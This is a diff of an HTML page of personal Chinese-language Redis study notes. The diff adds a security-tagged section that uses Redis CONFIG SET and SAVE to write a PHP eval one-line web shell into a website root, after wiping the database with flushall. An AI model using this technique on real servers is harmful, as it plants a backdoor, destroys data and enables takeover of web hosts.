@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2022-08-31 Wed 18:52 -->
+<!-- 2022-09-07 Wed 23:11 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Redis</title>
@@ -15,9 +15,14 @@
 <header>
 <h1 class="title">Redis</h1>
 </header>
+
 <div id="outline-container-orge5dfb31" class="outline-2">
 <h2 id="orge5dfb31">基本数据结构</h2>
 <div class="outline-text-2" id="text-orge5dfb31">
+<p>
+参考来源<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>。
+</p>
+
 <ul class="org-ul">
 <li>string 字符串</li>
 <li>list   列表</li>
@@ -200,15 +205,33 @@ zrem set key [key ...]
 </div>
 </div>
 
-<div id="outline-container-orgaa98824" class="outline-2">
-<h2 id="orgaa98824">Reference</h2>
-<div class="outline-text-2" id="text-orgaa98824">
-<ol class="org-ol">
-<li><a href="https://my.oschina.net/u/4526289/blog/5313452">https://my.oschina.net/u/4526289/blog/5313452</a></li>
-</ol>
+<div id="outline-container-orgd633aa4" class="outline-2">
+<h2 id="orgd633aa4">Redis 写文件落盘&#xa0;&#xa0;&#xa0;<span class="tag"><span class="security">security</span></span></h2>
+<div class="outline-text-2" id="text-orgd633aa4">
+<div class="org-src-container">
+<pre class="src src-redis">flushall
+config set dir C:\phpstudy_pro\WWW\one.php.local\
+config set dbfilename webshell.php
+set shell "&lt;?php eval($_POST["pass"]);?&gt;"
+save
+</pre>
+</div>
+<p>
+这样在 one.php.local 网站的根目录下就写了 webshell.php 这个一句话木马文件。
+</p>
 </div>
 </div>
+<div id="footnotes">
+<h2 class="footnotes">Footnotes: </h2>
+<div id="text-footnotes">
+
+<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
+<a href="https://my.oschina.net/u/4526289/blog/5313452">https://my.oschina.net/u/4526289/blog/5313452</a>
+</p></div></div>
+
+
 </div>
+</div></div>
 <div id="postamble" class="status">
 <a href="https://beian.miit.gov.cn" target="_blank">湘ICP证019014083号</a>
 </div>
